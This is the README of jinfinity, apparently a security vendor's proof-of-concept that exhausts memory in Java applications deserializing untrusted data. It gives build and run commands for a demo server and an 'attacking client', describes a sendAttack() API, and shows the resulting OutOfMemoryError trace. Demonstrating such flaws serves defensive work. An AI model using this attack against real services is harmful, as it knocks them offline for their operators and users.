jinfinity
========

An API and demonstration program for consuming all the memory of applications that deserialize data from untrusted sources (like HTTP requests.)

## How do I use this?

Use the com.contrastsecurity.jinfinity.JInfinity.java#sendAttack() API to push an unreasonable large serialized String to a target OutputStream.

## How can I run the demo program?

First, build the app:

```
git clone https://github.com/Contrast-Security-OSS/jinfinity.git
cd jinfinity
mvn clean package
```

To run the demo Jetty server, run this:
```
java -jar target/jinfinity-jar-with-dependencies.jar server
```

In another console, run the attacking client:
```
java -jar target/jinfinity-jar-with-dependencies.jar client
```

Within 30 seconds, the server will produce an OutOfMemoryError that looks something like this:

```
java.lang.OutOfMemoryError: Java heap space
	at java.lang.AbstractStringBuilder.expandCapacity(AbstractStringBuilder.java:99)
	at java.lang.AbstractStringBuilder.append(AbstractStringBuilder.java:518)
	at java.lang.StringBuffer.append(StringBuffer.java:307)
	at java.io.ObjectInputStream$BlockDataInputStream.readUTFSpan(ObjectInputStream.java:3044)
	at java.io.ObjectInputStream$BlockDataInputStream.readUTFBody(ObjectInputStream.java:2952)
	at java.io.ObjectInputStream$BlockDataInputStream.readLongUTF(ObjectInputStream.java:2935)
	at java.io.ObjectInputStream.readString(ObjectInputStream.java:1570)
```